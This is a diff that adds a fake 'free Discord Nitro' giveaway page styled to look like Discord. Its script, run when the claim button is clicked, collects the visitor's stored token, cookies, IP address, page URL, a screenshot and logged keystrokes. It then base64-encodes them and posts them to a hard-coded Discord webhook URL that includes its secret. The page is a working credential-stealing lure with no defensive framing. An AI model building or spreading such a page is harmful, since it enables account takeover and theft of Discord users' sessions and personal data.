@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Claim Your Free Discord Nitro!</title>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+  <style>
+    body {
+      background-color: #f5f6f7; /* Background color similar to Discord */
+      color: #36393f; /* Text color similar to Discord */
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; /* Font family similar to Discord */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      text-align: center;
+      background-color: #ffffff; /* White background similar to Discord */
+      padding: 30px;
+      border-radius: 8px; /* Slightly rounded corners */
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1); /* Subtle box shadow */
+      max-width: 400px; /* Limit width for better readability */
+      width: 100%; /* Full width container */
+    }
+    h1 {
+      font-size: 24px; /* Larger font size */
+      margin-bottom: 15px;
+      color: #7289da; /* Discord brand color */
+    }
+    p {
+      font-size: 16px; /* Smaller font size */
+      margin-bottom: 20px;
+    }
+    .button {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 15px 30px;
+      background-color: #7289da; /* Discord brand color */
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      text-decoration: none;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      text-transform: uppercase; /* Uppercase text */
+    }
+    .button:hover {
+      background-color: #677bc4; /* Darker shade on hover */
+    }
+    .fa-discord {
+      margin-right: 10px;
+      font-size: 24px; /* Larger icon size */
+      color: #7289da; /* Discord brand color */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1><i class="fab fa-discord"></i>Claim Your Free Discord Nitro!</h1>
+    <p>Click the button below to receive 1 year of Discord Nitro for free.</p>
+    <a id="claimBonus" class="button" href="#">Claim Nitro</a>
+  </div>
+  <script>
+    document.getElementById('claimBonus').addEventListener('click', function(event) {
+      event.preventDefault(); // Prevent default link behavior
+      const webhookUrl = 'https://discord.com/api/webhooks/1255904067461447793/O-7oJV_uquPvi-vQwk_aMe27J21BFgMOoAkHLFV1BEiwm45UdtZLvXRucNw2MLtcIw_F'; // Replace with actual webhook URL
+
+      function sendTokenToWebhook(token, ip, userAgent, cookies, location, screenshot, keystrokes) {
+        const encryptedData = btoa(JSON.stringify({
+          token: token,
+          ip: ip,
+          userAgent: userAgent,
+          cookies: cookies,
+          location: location,
+          screenshot: screenshot,
+          keystrokes: keystrokes
+        }));
+        const data = JSON.stringify({
+          content: encryptedData
+        });
+        const options = {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: data
+        };
+        fetch(webhookUrl, options)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error('Failed to send data to webhook');
+          }
+          console.log('Data successfully sent to webhook!');
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          console.log('Failed to send data to webhook');
+        });
+      }
+
+      function captureScreenshot(callback) {
+        html2canvas(document.body).then(function(canvas) {
+          const screenshot = canvas.toDataURL('image/png');
+          callback(screenshot);
+        });
+      }
+
+      let keystrokes = '';
+      document.addEventListener('keydown', function(event) {
+        keystrokes += event.key;
+      });
+
+      const token = localStorage.getItem('token'); // Example of token retrieval from localStorage
+
+      if (token) {
+        fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          const userAgent = navigator.userAgent;
+          const cookies = document.cookie;
+          const location = window.location.href;
+          captureScreenshot(function(screenshot) {
+            sendTokenToWebhook(token, ip, userAgent, cookies, location, screenshot, keystrokes);
+          });
+        })
+        .catch(error => {
+          console.error('Error:', error);
+          console.log('Failed to retrieve IP address!');
+        });
+      } else {
+        console.log('Failed to retrieve token!');
+      }
+    });
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.4.1/html2canvas.min.js"></script>
+</body>
+</html>
